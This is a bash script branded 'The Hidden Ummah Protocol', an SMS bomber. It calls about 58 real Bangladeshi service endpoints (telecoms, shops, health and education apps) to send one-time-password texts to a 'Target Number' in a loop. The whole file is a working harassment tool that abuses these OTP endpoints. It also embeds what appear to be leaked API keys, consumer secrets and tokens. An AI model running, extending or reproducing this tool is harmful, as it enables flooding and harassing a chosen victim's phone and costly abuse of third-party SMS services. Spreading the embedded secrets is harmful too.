#!/bin/bash

# ==============================================
#   THE HIDDEN UMMAH PROTOCOL v1.0
#   OTP SMS Bomber | 70+ APIs | Auto-Retry
#   Made by IskenderTujk
# ==============================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m'

# Settings
TIMEOUT=8
DELAY=0.3

# Banner
clear
echo -e "${CYAN}"
echo "╔════════════════════════════════════════════════════════════╗"
echo "║                                                            ║"
echo -e "║     ${WHITE}████████╗██╗  ██╗███████╗${CYAN}                        ║"
echo -e "║     ${WHITE}╚══██╔══╝██║  ██║██╔════╝${CYAN}                        ║"
echo -e "║     ${WHITE}   ██║   ███████║█████╗  ${CYAN}                        ║"
echo -e "║     ${WHITE}   ██║   ██╔══██║██╔══╝  ${CYAN}                        ║"
echo -e "║     ${WHITE}   ██║   ██║  ██║███████╗${CYAN}                        ║"
echo -e "║     ${WHITE}   ╚═╝   ╚═╝  ╚═╝╚══════╝${CYAN}                        ║"
echo "║                                                            ║"
echo -e "║     ${MAGENTA}▄▄▄▄▄▄▄▄▄▄▄  ██▀███   ██▀███  ▄▄▄█████▓ ▒█████${CYAN}   ║"
echo -e "║     ${MAGENTA}▓█████▄ ▓██ ▒ ██▒▓██ ▒ ██▒▓  ██▒ ▓▒▒██▒  ██▒${CYAN}   ║"
echo -e "║     ${MAGENTA}▒██▒ ▄██▓██ ░▄█ ▒▓██ ░▄█ ▒▒ ▓██░ ▒░▒██░  ██▒${CYAN}   ║"
echo -e "║     ${MAGENTA}▒██░█▀  ▒██▀▀█▄  ▒██▀▀█▄  ░ ▓██▓ ░ ▒██   ██░${CYAN}   ║"
echo -e "║     ${MAGENTA}░▓█  ▀█▓░██▓ ▒██▒░██▓ ▒██▒  ▒██▒ ░ ░ ████▓▒░${CYAN}   ║"
echo -e "║     ${MAGENTA}░▒▓███▀▒░ ▒▓ ░▒▓░░ ▒▓ ░▒▓░  ▒ ░░   ░ ▒░▒░▒░${CYAN}   ║"
echo "║                                                            ║"
echo -e "║       ${WHITE}ＴＨＥ   ＨＩＤＤＥＮ   ＵＭＭＡＨ   ＰＲＯＴＯＣＯＬ${CYAN}      ║"
echo -e "║                ${YELLOW}S M S   B O M B E R${CYAN}                    ║"
echo "║                                                            ║"
echo -e "║              ${GREEN}⚡ Made by IskenderTujk ⚡${CYAN}               ║"
echo "║                                                            ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# API Functions
send_redx() { curl -s -k --max-time $TIMEOUT -X POST "https://api.redx.com.bd/v1/user/signup" -H "Content-Type: application/json" -d "{\"name\":\"$1\",\"service\":\"redx\",\"phoneNumber\":\"$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_arogga() { curl -s -k --max-time $TIMEOUT -X POST "https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome" -d "mobile=$1&fcmToken=&referral=" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_bdstall() { curl -s -k --max-time $TIMEOUT -X POST "https://www.bdstall.com/userRegistration/save_otp_info/" -d "UserTypeID=2&RequestType=1&Name=Md&Mobile=$1" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_doctorlive() { curl -s -k --max-time $TIMEOUT -X POST "https://doctorlivebd.com/api/patient/auth/otpsend" -d "country_code=880&mobile=$1" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_bcsexam() { curl -s -k --max-time $TIMEOUT -X POST "https://bcsexamaid.com/api/generateotp" -H "Content-Type: application/json" -d "{\"mobile\":\"$1\",\"softtoken\":\"Rifat.Admin.2022\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_apex4u() { curl -s -k --max-time $TIMEOUT -X POST "https://api.apex4u.com/api/auth/login" -H "Content-Type: application/json" -d "{\"phoneNumber\":\"$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_sindabad() { curl -s -k --max-time $TIMEOUT -X POST "https://offers.sindabad.com/api/mobile-otp" -H "Content-Type: application/json" -d "{\"key\":\"c94e67fb2a59af3b6fa21f24463b2061\",\"mobile\":\"+88$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_shikho() { curl -s -k --max-time $TIMEOUT -X POST "https://api.shikho.com/auth/v2/send/sms" -H "Content-Type: application/json" -d "{\"phone\":\"$1\",\"type\":\"student\",\"auth_type\":\"signup\",\"vendor\":\"shikho\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_circle() { curl -s -k --max-time $TIMEOUT -X POST "https://reseller.circle.com.bd/api/v2/auth/signup" -H "Content-Type: application/json" -d "{\"name\":\"+88$1\",\"email_or_phone\":\"+88$1\",\"password\":\"123456\",\"password_confirmation\":\"123456\",\"register_by\":\"phone\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_bdtickets() { curl -s -k --max-time $TIMEOUT -X POST "https://api.bdtickets.com:20100/v1/auth" -H "Content-Type: application/json" -d "{\"createUserCheck\":true,\"phoneNumber\":\"+88$1\",\"applicationChannel\":\"WEB_APP\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_gpshop() { curl -s -k --max-time $TIMEOUT -X POST "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp" -H "Content-Type: application/json" -d "{\"phone\":\"$1\",\"email\":\"\",\"language\":\"en\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_rflbestbuy() { curl -s -k --max-time $TIMEOUT -X POST "https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT" -H "Content-Type: application/json" -d "{\"company_id\":\"26\",\"password2\":\"Riyaz@123\",\"currency_code\":\"BDT\",\"user_type\":\"C\",\"email\":\"$1@gmail.com\",\"phone\":\"$1\",\"storefront_id\":\"3\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_chorki() { curl -s -k --max-time $TIMEOUT -X POST "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile" -H "Content-Type: application/json" -d "{\"number\":\"$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_hishab() { curl -s -k --max-time $TIMEOUT -X POST "https://api.hishabexpress.com/login/status" -d "msisdn=$1&hash=Hello" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_mujib() { curl -s -k --max-time $TIMEOUT -X GET "https://mujib.chorcha.net/auth/check?phone=$1" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_wafilife() { curl -s -k --max-time $TIMEOUT -X GET "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p=$1&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_robi() { curl -s -k --max-time $TIMEOUT -X POST "https://webapi.robi.com.bd/v1/account/register/otp" -H "Content-Type: application/json" -d "{\"phone_number\":\"$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_chardike() { curl -s -k --max-time $TIMEOUT -X POST "https://api.chardike.com/api/otp/send" -H "Content-Type: application/json" -d "{\"phone\":\"$1\",\"otp_type\":\"login\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_bioscope() { curl -s -k --max-time $TIMEOUT -X POST "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en" -H "Content-Type: application/json" -d "{\"number\":\"+88$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_etestpaper() { curl -s -k --max-time $TIMEOUT -X POST "https://prod.etestpaper.net/api/v4/auth/otp" -H "Content-Type: application/json" -d "{\"phone\":\"$1\",\"recaptcha\":\"668be73dcad2999a957ff440\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_gpay() { curl -s -k --max-time $TIMEOUT -X POST "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup" -H "Content-Type: application/json" -d "{\"deviceId\":\"35${1}30\",\"msisdn\":\"$1\",\"tran_type\":\"OTPREQSIGNUP\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_applink() { curl -s -k --max-time $TIMEOUT -X POST "https://apps.applink.com.bd/appstore-v4-server/login/otp/request" -H "Content-Type: application/json" -d "{\"msisdn\":\"88$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_priyoshikkha() { curl -s -k --max-time $TIMEOUT -X POST "https://app.priyoshikkhaloy.com/api/user/register-login.php" -d "mobile=$1" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_kabbik() { local ts=$(date +%s%3N); curl -s -k --max-time $TIMEOUT -X POST "https://api.kabbik.com/v1/auth/otpnew" -H "Content-Type: application/json" -d "{\"msisdn\":\"88$1\",\"currentTimeLong\":$ts,\"passKey\":\"qOQNBtVmoTTPVmfn\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_salextra() { curl -s -k --max-time $TIMEOUT -X POST "https://salextra.com.bd/customer/checkusernameavailabilityonregistration" -d "username=$1&loginType=MOBILE&__RequestVerificationToken=CfDJ8LiTcoRywYZJiSdmMqGF8TUqJw9C6KMdGm1h66OVTdHacNf0PM5Ejsmu_DNPddqz7Sk-XUyXwxIyHALKpZ5bn1jwr9l-9IzOmASY_Z3cKb2mndEZn3KyLqq80U8QyitKCPtmt1zxxiMWd_970_jfTmg" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_sundora() { curl -s -k --max-time $TIMEOUT -X POST "https://api.sundora.com.bd/api/user/customer/" -H "Content-Type: application/json" -d "{\"customer\":{\"email\":\"$1@gmail.com\",\"password\":\"#bUV?'3*N#7N}.g\",\"password_confirmation\":\"#bUV?'3*N#7N}.g\",\"phone\":\"+88$1\",\"first_name\":\"User\",\"last_name\":\"Test\",\"newsletter_sms\":true}}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_bajistar() { curl -s -k --max-time $TIMEOUT -X GET "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88$1" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_doctime() { curl -s -k --max-time $TIMEOUT -X POST "https://api.doctime.com.bd/api/authenticate" -H "Content-Type: application/json" -d "{\"contact_no\":\"$1\",\"country_calling_code\":\"88\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_bikroy() { curl -s -k --max-time $TIMEOUT -X GET "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$1" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_webloginda() { curl -s -k --max-time $TIMEOUT -X POST "https://webloginda.grameenphone.com/backend/api/v1/otp" -d "msisdn=$1" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_meenabazar() { curl -s -k --max-time $TIMEOUT -X GET "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone=$1&type=login" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_shomvob() { curl -s -k --max-time $TIMEOUT -X POST "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0" -H "Content-Type: application/json" -d "{\"phone\":\"88$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_iqralive() { curl -s -k --max-time $TIMEOUT -X GET "http://apibeta.iqra-live.com/api/v1/sent-otp/$1" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_chokrojan() { curl -s -k --max-time $TIMEOUT -X POST "https://chokrojan.com/api/v1/passenger/login/mobile" -H "Content-Type: application/json" -d "{\"mobile_number\":\"$1\",\"otp_token\":\"826cb796fd3f163c420c8da1238aa9d1c4da36d4f5729d711a9cacaca47df5a7\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_medeasy() { curl -s -k --max-time $TIMEOUT -X GET "https://api.medeasy.health/api/send-otp/+88$1/" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_eonbazar() { curl -s -k --max-time $TIMEOUT -X POST "https://app.eonbazar.com/api/auth/login" -H "Content-Type: application/json" -d "{\"method\":\"otp\",\"mobile\":\"$(echo $1 | sed 's/^0//')\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_eatz() { curl -s -k --max-time $TIMEOUT -X POST "https://api.eat-z.com/auth/customer/app-connect" -H "Content-Type: application/json" -d "{\"username\":\"+880$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_osudpotro() { curl -s -k --max-time $TIMEOUT -X POST "https://api.osudpotro.com/api/v1/users/send_otp" -H "Content-Type: application/json" -d "{\"mobile\":\"+88-$1\",\"deviceToken\":\"app\",\"language\":\"bn\",\"os\":\"android\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_kormi24() { curl -s -k --max-time $TIMEOUT -X POST "https://api.kormi24.com/graphql" -H "Content-Type: application/json" -d "{\"operationName\":\"sendOTP\",\"variables\":{\"type\":1,\"mobile\":\"$1\",\"additional\":\"{\\\"user_agent\\\":\\\"web\\\",\\\"mobile\\\":\\\"$1\\\"}\",\"hash\":\"c3275518789fb74ac6cc30ce030afbf0bdff578579e2fb64571e63f5b2680180\"},\"query\":\"mutation sendOTP(\\\$mobile: String!, \\\$type: Int!, \\\$additional: String, \\\$hash: String!) { sendOTP(mobile: \\\$mobile, type: \\\$type, additional: \\\$additional, hash: \\\$hash) { status message __typename } }\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_quizgiri() { curl -s -k --max-time $TIMEOUT -X POST "https://developer.quizgiri.xyz:443/api/v2.0/send-otp" -H "Content-Type: application/json" -d "{\"phone\":\"$1\",\"country_code\":\"+880\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_shwapno() { curl -s -k --max-time $TIMEOUT -X POST "https://www.shwapno.com/api/auth" -H "Content-Type: application/json" -d "{\"phoneNumber\":\"+88$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_mybl() { curl -s -k --max-time $TIMEOUT -X POST "https://myblapi.banglalink.net/api/v1/send-otp" -H "Content-Type: application/json" -d "{\"phone\":\"$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_waltonplaza() { curl -s -k --max-time $TIMEOUT -X POST "https://api.waltonplaza.com.bd/graphql" -H "Content-Type: application/json" -d "{\"operationName\":\"createCustomerOtp\",\"variables\":{\"auth\":{\"countryCode\":\"880\",\"deviceUuid\":\"998283c0-622a-11ee-84c0-190466a47baa\",\"phone\":\"$1\"},\"device\":null},\"query\":\"mutation createCustomerOtp(\\\$auth: CustomerAuthInput!, \\\$device: DeviceInput) { createCustomerOtp(auth: \\\$auth, device: \\\$device) { message result { id } statusCode } }\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_pbs() { curl -s -k --max-time $TIMEOUT -X POST "https://apialpha.pbs.com.bd/api/OTP/generateOTP" -H "Content-Type: application/json" -d "{\"userPhone\":\"$1\",\"otp\":\"\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_aarong() { curl -s -k --max-time $TIMEOUT -X POST "https://mcprod.aarong.com/graphql" -H "Content-Type: application/json" -d "{\"query\":\"mutation resendOtp(\\\$email: String, \\\$mobile_number: String!, \\\$type: String!) { resendOtp(input: { email: \\\$email, mobile_number: \\\$mobile_number, type: \\\$type }) }\",\"variables\":{\"email\":\"\",\"mobile_number\":\"$1\",\"type\":\"mobile_number\"}}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_dressup() { curl -s -k --max-time $TIMEOUT -X POST "https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp" -H "Content-Type: application/json" -d "{\"country_code\":\"+880\",\"mobile\":\"$1\",\"type\":\"login\",\"whatsapp\":false}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_ghoori() { curl -s -k --max-time $TIMEOUT -X POST "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web" -H "Content-Type: application/json" -d "{\"mobile_no\":\"$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_medha() { curl -s -k --max-time $TIMEOUT -X POST "https://developer.medha.info/api/send-otp" -H "Content-Type: application/json" -d "{\"phone\":\"880$1\",\"is_register\":\"1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_garibook() { curl -s -k --max-time $TIMEOUT -X POST "https://api.garibookadmin.com/api/v3/user/login" -H "Content-Type: application/json" -d "{\"mobile\":\"$1\",\"recaptcha_token\":\"garibookcaptcha\",\"channel\":\"web\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_fabrilife() { curl -s -k --max-time $TIMEOUT -X POST "https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/$1" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_kotha() { local did=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo "test-$(date +%s)"); curl -s -k --max-time $TIMEOUT -X POST "https://user.kotha.im/mobile/api/sendOTPV2" -H "Content-Type: application/json" -d "{\"deviceId\":\"$did\",\"recipient\":\"+88$1\",\"retryAttempt\":0}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_btcl() { curl -s -k --max-time $TIMEOUT -X POST "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1" -d "actionType=otpSend&mobileNo=$(echo $1 | sed 's/^0//')" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_deeptoplay() { curl -s -k --max-time $TIMEOUT -X POST "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en" -H "Content-Type: application/json" -d "{\"number\":\"+88$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_robiapi9() { curl -s -k --max-time $TIMEOUT -X POST "https://webapi.robi.com.bd/v1/send-otp" -H "Content-Type: application/json" -d "{\"phone_number\":\"$1\",\"type\":\"doorstep\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_beautybooth() { curl -s -k --max-time $TIMEOUT -X POST "https://admin.beautybooth.com.bd/api/v2/auth/signup" -H "Content-Type: application/json" -d "{\"phone\":\"$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_quiztime() { curl -s -k --max-time $TIMEOUT -X POST "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp" -H "Content-Type: application/json" -d "{\"country_code\":\"+88\",\"phone\":\"$1\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_sundarban() { curl -s -k --max-time $TIMEOUT -X POST "https://api-gateway.sundarbancourierltd.com/graphql" -H "Content-Type: application/json" -d "{\"operationName\":\"CreateAccessToken\",\"variables\":{\"accessTokenFilter\":{\"userName\":\"$1\"}},\"query\":\"mutation CreateAccessToken(\\\$accessTokenFilter: AccessTokenInput!) { createAccessToken(accessTokenFilter: \\\$accessTokenFilter) { message statusCode result { phone otpCounter } } }\"}" 2>/dev/null | grep -qiE "success|otp|sent"; }
send_btclphonebill() { curl -s -k --max-time $TIMEOUT -X POST "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json" -H "Content-Type: application/json" -d "{\"phoneNbr\":\"$1\",\"OTPType\":1}" 2>/dev/null | grep -qiE "success|otp|sent"; }

APIS=(
    "send_redx" "send_arogga" "send_bdstall" "send_doctorlive" "send_bcsexam"
    "send_apex4u" "send_sindabad" "send_shikho" "send_circle" "send_bdtickets"
    "send_gpshop" "send_rflbestbuy" "send_chorki" "send_hishab" "send_mujib"
    "send_wafilife" "send_robi" "send_chardike" "send_bioscope" "send_etestpaper"
    "send_gpay" "send_applink" "send_priyoshikkha" "send_kabbik" "send_salextra"
    "send_sundora" "send_bajistar" "send_doctime" "send_bikroy" "send_webloginda"
    "send_meenabazar" "send_shomvob" "send_iqralive" "send_chokrojan" "send_medeasy"
    "send_eonbazar" "send_eatz" "send_osudpotro" "send_kormi24" "send_quizgiri"
    "send_shwapno" "send_mybl" "send_waltonplaza" "send_pbs" "send_aarong"
    "send_dressup" "send_ghoori" "send_medha" "send_garibook" "send_fabrilife"
    "send_kotha" "send_btcl" "send_deeptoplay" "send_robiapi9" "send_beautybooth"
    "send_quiztime" "send_sundarban" "send_btclphonebill"
)

send_otp_smart() {
    local phone=$1
    local apis=("${APIS[@]}")
    local shuffled=($(printf "%s\n" "${apis[@]}" | shuf))
    for api in "${shuffled[@]}"; do
        if $api "$phone" 2>/dev/null; then
            return 0
        fi
    done
    return 1
}

# Main Execution
echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -ne "${GREEN}📱 Target Number : ${NC}"
read phone
phone=$(echo "$phone" | sed 's/^+88//' | sed 's/^88//')

if [[ ! "$phone" =~ ^01[0-9]{9}$ ]]; then
    echo -e "${RED}❌ Invalid! Use 11 digits starting with 01${NC}"
    exit 1
fi

echo -ne "${GREEN}💣 SMS Quantity  : ${NC}"
read quantity
while [[ ! "$quantity" =~ ^[0-9]+$ ]] || [ $quantity -lt 1 ]; do
    echo -ne "${RED}Invalid! Enter number: ${NC}"
    read quantity
done

echo -ne "${CYAN}⏱️  Delay (sec)    : ${NC}"
read delay_input
[ -n "$delay_input" ] && DELAY=$delay_input

echo -e "\n${YELLOW}🔥 Protocol Activated...${NC}\n"

SUCCESS=0
FAILED=0

for ((i=1; i<=quantity; i++)); do
    printf "[%4d/%4d] " $i $quantity
    if send_otp_smart "$phone"; then
        echo -e "${GREEN}✓${NC}"
        ((SUCCESS++))
    else
        echo -e "${RED}✗${NC}"
        ((FAILED++))
    fi
    [ $i -lt $quantity ] && sleep $DELAY
done

echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${GREEN}✅ Success : ${SUCCESS}${NC}"
echo -e "${RED}❌ Failed  : ${FAILED}${NC}"
echo -e "${YELLOW}📊 Rate    : $((SUCCESS * 100 / quantity))%${NC}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${MAGENTA}⚡ The Hidden Ummah Protocol - Mission Complete ⚡${NC}"
